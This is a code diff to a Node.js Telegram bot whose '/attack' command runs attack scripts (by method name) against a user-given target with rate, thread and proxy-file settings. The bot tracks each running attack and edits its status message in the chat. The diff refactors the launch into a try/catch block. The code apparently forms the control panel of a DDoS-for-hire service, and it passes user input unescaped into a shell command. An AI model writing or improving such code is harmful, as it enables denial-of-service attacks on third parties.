@@ -114,63 +114,69 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
     proxyfile
   }, null, 2) + '\n```', { parse_mode: 'Markdown' })
   attackData.messageId = sentMsg.message_id
+  attacks.push(attackData)
 
-  const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
-    if (err) {
-      bot.sendMessage(msg.chat.id, `Attack failed: ${err.message}`)
-      attacks = attacks.filter(a => a.id !== attackId)
-      return
-    }
-    bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully`)
-  })
-
-  child.on('error', (err) => {
-    bot.sendMessage(msg.chat.id, `Child process error: ${err.message}`)
-    attacks = attacks.filter(a => a.id !== attackId)
-    bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
-  })
-
-  child.on('spawn', () => {
-    attackData.pid = child.pid
-    attacks.push(attackData)
-
-    const interval = setInterval(() => {
-      const now = Date.now()
-      const remainingTime = Math.max(0, Math.round((attackData.endTime - now) / 1000))
-      attackData.status = 'running'
-
-      if (remainingTime <= 0 || !attacks.find(a => a.id === attackId)) {
-        clearInterval(interval)
-        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
+  try {
+    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
+      if (err) {
+        bot.sendMessage(msg.chat.id, `Attack failed: ${err.message}`)
         attacks = attacks.filter(a => a.id !== attackId)
+        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
         return
       }
+      bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully`)
+    })
 
-      bot.editMessageText('```json\n' + JSON.stringify({
-        status: attackData.status,
-        target,
-        time: remainingTime,
-        rate,
-        threads,
-        proxyfile
-      }, null, 2) + '\n```', {
-        chat_id: msg.chat.id,
-        message_id: attackData.messageId,
-        parse_mode: 'Markdown'
-      }).catch((err) => {
-        bot.sendMessage(msg.chat.id, `Error updating attack status: ${err.message}`)
-        clearInterval(interval)
-        attacks = attacks.filter(a => a.id !== attackId)
-      })
-    }, 5000)
-  })
+    child.on('error', (err) => {
+      bot.sendMessage(msg.chat.id, `Child process error: ${err.message}`)
+      attacks = attacks.filter(a => a.id !== attackId)
+      bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
+    })
 
-  child.on('exit', () => {
+    child.on('spawn', () => {
+      attackData.pid = child.pid
+      const interval = setInterval(() => {
+        const now = Date.now()
+        const remainingTime = Math.max(0, Math.round((attackData.endTime - now) / 1000))
+        attackData.status = 'running'
+
+        if (remainingTime <= 0 || !attacks.find(a => a.id === attackId)) {
+          clearInterval(interval)
+          bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
+          attacks = attacks.filter(a => a.id !== attackId)
+          return
+        }
+
+        bot.editMessageText('```json\n' + JSON.stringify({
+          status: attackData.status,
+          target,
+          time: remainingTime,
+          rate,
+          threads,
+          proxyfile
+        }, null, 2) + '\n```', {
+          chat_id: msg.chat.id,
+          message_id: attackData.messageId,
+          parse_mode: 'Markdown'
+        }).catch((err) => {
+          bot.sendMessage(msg.chat.id, `Error updating attack status: ${err.message}`)
+          clearInterval(interval)
+          attacks = attacks.filter(a => a.id !== attackId)
+        })
+      }, 5000)
+    })
+
+    child.on('exit', () => {
+      attacks = attacks.filter(a => a.id !== attackId)
+      bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
+    })
+
+    bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`)
+  } catch (err) {
+    bot.sendMessage(msg.chat.id, `Failed to start attack: ${err.message}`)
     attacks = attacks.filter(a => a.id !== attackId)
     bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
-  })
-
-  bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`)
+  }
 })
 
 bot.onText(/^\/list$/, (msg) => {
